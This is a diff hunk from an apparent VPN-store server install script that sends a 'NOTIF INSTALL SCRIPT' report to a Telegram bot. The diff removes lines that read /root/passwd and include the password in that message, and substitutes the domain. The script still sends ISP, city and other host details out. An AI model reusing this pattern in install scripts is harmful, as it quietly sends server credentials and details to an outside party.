@@ -317,7 +317,7 @@ URL="https://api.telegram.org/bot$KEY/sendMessage"
 ISP=$(cat /root/.isp)
 CITY=$(cat /root/.city)
 TIMEZONE=$(printf '%(%H:%M:%S)T')
-PASSWD=$(cat /root/passwd)
+DOMAIN=$(cat /root/domain)
     TEXT="
 <code>────────────────────</code>
 <b>⚡𝗡𝗢𝗧𝗜𝗙 𝗜𝗡𝗦𝗧𝗔𝗟𝗟 𝗦𝗖𝗥𝗜𝗣𝗧⚡</b>
@@ -328,7 +328,7 @@ PASSWD=$(cat /root/passwd)
 <code>DATE     :</code><code>$DATE</code>
 <code>Time     :</code><code>$TIMEZONE</code>
 <code>Exp Sc.  :</code><code>$exp</code>
-<code>PASSWD     :</code><code>$passwd</code>
+<code>DOMAIN     :</code><code>$domain</code>
 <code>─────────────────────────────</code>
 <b> LUCKI NS CENTER VPN STORE SCRIPT  </b>
 <code>─────────────────────────────</code>
